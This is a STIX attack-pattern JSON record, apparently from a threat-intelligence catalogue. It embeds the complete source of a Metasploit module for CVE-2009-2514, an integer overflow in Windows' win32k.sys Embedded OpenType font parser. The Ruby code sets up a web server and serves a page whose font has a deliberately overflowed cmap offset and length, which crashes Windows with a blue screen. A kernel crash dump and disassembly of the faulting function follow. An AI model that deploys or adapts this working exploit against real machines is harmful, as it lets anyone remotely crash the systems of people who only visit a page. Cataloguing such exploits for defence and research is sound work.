{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c4354b4-6f4b-41d4-b694-cd4d8a3820c4",
    "created": "2024-08-14T16:25:10.418547Z",
    "modified": "2024-08-14T16:25:10.418551Z",
    "name": "Microsoft Windows EOT Font Table Directory Integer Overflow",
    "description": " This module exploits an integer overflow flaw in the Microsoft Windows Embedded OpenType font parsing code located in win32k.sys. Since the kernel itself parses embedded web fonts, it is possible to trigger a BSoD from a normal web page when viewed with Internet Explorer.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/browser/ms09_065_eot_integer.rb",
            "external_id": "ms09_065_eot_integer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2514"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Microsoft Windows EOT Font Table Directory Integer Overflow',\n      'Description'    => %q{\n        This module exploits an integer overflow flaw in the Microsoft Windows Embedded\n      OpenType font parsing code located in win32k.sys. Since the kernel itself parses\n      embedded web fonts, it is possible to trigger a BSoD from a normal web page when\n      viewed with Internet Explorer.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'hdm',\n      'References'     =>\n        [\n          [ 'CVE', '2009-2514' ],\n          [ 'MSB', 'MS09-065' ],\n          [ 'OSVDB', '59869']\n        ],\n      'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n      'PassiveActions' => [ 'WebServer' ],\n      'DefaultAction'  => 'WebServer',\n      'DisclosureDate' => '2009-11-10'\n    ))\n    register_options([\n      OptPath.new('EOTFILE', [ true, \"The EOT template to use to generate the trigger\", File.join(Msf::Config.data_directory, \"exploits\", \"pricedown.eot\")]),\n    ])\n\n  end\n\n  def run\n    exploit\n  end\n\n  def on_request_uri(cli, request)\n    @tag ||= Rex::Text.rand_text_alpha(8)\n    @eot ||= ::File.read(datastore['EOTFILE'], ::File.size(datastore['EOTFILE']), mode: 'rb')\n\n    if(request.uri =~ /#{@tag}$/)\n      content = @eot.dup\n\n      # Only this table entry seems to trigger the bug\n      cidx = content.index('cmap')\n\n      # Use an offset and a length that overflow when combined\n      coff = 0xb0000000\n      clen = (0xfffffffe - coff + 0xcc)\n\n      # Patch in the modified offset and length values\n      content[cidx + 8, 8] = [ coff, clen ].pack(\"N*\")\n\n      # Send the font on its merry way\n      print_status(\"Sending embedded font...\")\n      send_response_html(cli, content, { 'Content-Type' => 'application/octet-stream' })\n    else\n      var_title = Rex::Text.rand_text_alpha(6 + rand(32))\n      var_body = Rex::Text.rand_text_alpha(64 + rand(32))\n      var_font = Rex::Text.rand_text_alpha(2 + rand(6))\n      var_face = Rex::Text.rand_text_alpha(2 + rand(32))\n\n      content = %Q|<html><head><title>#{var_title}</title><style type=\"text/css\">\n@font-face{ font-family: '#{var_face}';  src: url('#{get_resource}/#{var_font}#{@tag}'); }\nbody {\n  font-family: '#{var_face}';\n}\n</style></head><body> #{var_body} </body></html>|\n\n      print_status(\"Sending HTML page with embedded font...\")\n      send_response_html(cli, content, { 'Content-Type' => 'text/html' })\n    end\n  end\nend\n\n=begin\n\n#\n# Crash dump information\n#\n\nREAD_ADDRESS:  b0f70072\n\nFAULTING_IP:\nwin32k!bComputeIDs+28\nbf87c9df 8a6702          mov     ah,byte ptr [edi+2]\n\nMM_INTERNAL_CODE:  0\n\nIMAGE_NAME:  win32k.sys\n\nDEBUG_FLR_IMAGE_TIMESTAMP:  45f013f6\n\nMODULE_NAME: win32k\n\nFAULTING_MODULE: bf800000 win32k\n\nDEFAULT_BUCKET_ID:  DRIVER_FAULT\n\nBUGCHECK_STR:  0x50\n\nPROCESS_NAME:  csrss.exe\n\nTRAP_FRAME:  b22192e8 -- (.trap 0xffffffffb22192e8)\nErrCode = 00000000\neax=00000000 ebx=00000000 ecx=500000ca edx=00f70010 esi=b22198d8 edi=b0f70070\neip=bf87c9df esp=b221935c ebp=b2219374 iopl=0         nv up ei pl nz na pe nc\ncs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010206\nwin32k!bComputeIDs+0x28:\nbf87c9df 8a6702          mov     ah,byte ptr [edi+2]        ds:0023:b0f70072=??\nResetting default scope\n\nLAST_CONTROL_TRANSFER:  from 804f79d7 to 80526fc8\n\nSTACK_TEXT:\nb2218e24 804f79d7 00000003 b0f70072 00000000 nt!RtlpBreakWithStatusInstruction\nb2218e70 804f85c4 00000003 00000000 c0587b80 nt!KiBugCheckDebugBreak+0x19\nb2219250 804f8aef 00000050 b0f70072 00000000 nt!KeBugCheck2+0x574\nb2219270 8051c0d3 00000050 b0f70072 00000000 nt!KeBugCheckEx+0x1b\nb22192d0 8053f90c 00000000 b0f70072 00000000 nt!MmAccessFault+0x8e7\nb22192d0 bf87c9df 00000000 b0f70072 00000000 nt!KiTrap0E+0xcc\nb2219374 bf87a391 00f70010 b22198d8 b2219a76 win32k!bComputeIDs+0x28\nb22193a8 bf87a02b 00f70010 00004d18 00000000 win32k!bVerifyTTF+0xe1\nb2219a68 bf879f0e e234b668 00f70010 00004d18 win32k!bLoadTTF+0x7c\nb2219af0 bf879e48 e234b668 00f70010 00004d18 win32k!bLoadFontFile+0x228\nb2219b40 bf879911 00000001 e234b660 b2219bf0 win32k!ttfdSemLoadFontFile+0x4c\nb2219b70 bf87989f 00000001 e234b660 b2219bf0 win32k!PDEVOBJ::LoadFontFile+0x3a\nb2219ba8 bf96370c 00000000 00000000 e234b660 win32k!vLoadFontFileView+0x12b\nb2219c5c bf93eda9 e234b660 00000000 00000000 win32k!PUBLIC_PFTOBJ::hLoadMemFonts+0x6a\nb2219cb4 bf9488e4 00f70000 e10ff0b0 00000000 win32k!GreAddFontMemResourceEx+0x76\nb2219d48 8053ca28 0297cc48 00004d18 00000000 win32k!NtGdiAddFontMemResourceEx+0xb0\nb2219d48 7c90eb94 0297cc48 00004d18 00000000 nt!KiFastCallEntry+0xf8\n0172f6dc 00000000 00000000 00000000 00000000 ntdll!KiFastSystemCallRet\n\nwin32k!bComputeIDs:\nbf87c9b7 8bff            mov     edi,edi\nbf87c9b9 55              push    ebp\nbf87c9ba 8bec            mov     ebp,esp\nbf87c9bc 83ec10          sub     esp,10h\nbf87c9bf 8b450c          mov     eax,dword ptr [ebp+0Ch]\nbf87c9c2 8b4804          mov     ecx,dword ptr [eax+4]\nbf87c9c5 53              push    ebx\nbf87c9c6 57              push    edi\nbf87c9c7 8b38            mov     edi,dword ptr [eax]\nbf87c9c9 037d08          add     edi,dword ptr [ebp+8]\nbf87c9cc 33db            xor     ebx,ebx\nbf87c9ce 33c0            xor     eax,eax\nbf87c9d0 83f904          cmp     ecx,4\nbf87c9d3 895df8          mov     dword ptr [ebp-8],ebx\nbf87c9d6 894dfc          mov     dword ptr [ebp-4],ecx\nbf87c9d9 0f82cf000000    jb      win32k!bComputeIDs+0x1be (bf87caae)\nbf87c9df 8a6702          mov     ah,byte ptr [edi+2]  <--- the crash above\n\n=end\n",
    "x_mitre_disclosure_date": "2009-11-10"
}